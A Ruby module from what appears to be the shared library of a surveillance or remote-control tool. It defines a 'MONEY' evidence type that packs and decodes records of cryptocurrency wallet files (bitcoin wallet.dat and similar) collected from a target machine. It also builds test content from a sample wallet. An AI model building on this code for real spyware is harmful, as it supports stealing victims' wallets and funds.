require 'rcs-common/evidence/common'

require 'digest/md5'

module RCS

module MoneyEvidence

  MONEY_VERSION = 2014010101

  TYPES = {:bitcoin => 0x00,
           :litecoin => 0x30,
           :feathercoin => 0x0E,
           :namecoin => 0x34}

  def content
    path = File.join(File.dirname(__FILE__), 'content/coin/wallet.dat')
    File.open(path, 'rb') {|f| f.read }
  end

  def generate_content
    [ content ]
  end

  def additional_header
    file_name = '~/Library/Application Support/Bitcoin/wallet.dat'.to_utf16le_binary
    header = StringIO.new
    header.write [MONEY_VERSION].pack("I")
    header.write [TYPES[:bitcoin]].pack("I")
    header.write [file_name.size].pack("I")
    header.write file_name
    
    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete MONEY") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version, type, file_name_len = binary.read(12).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for MONEY") unless version == MONEY_VERSION

    ret = Hash.new
    ret[:data] = Hash.new
    ret[:type] = TYPES.invert[type]
    ret[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?
    info[:grid_content] = chunks.join
    info[:data][:size] = info[:grid_content].bytesize
    yield info if block_given?
    :delete_raw
  end
end

end # ::RCS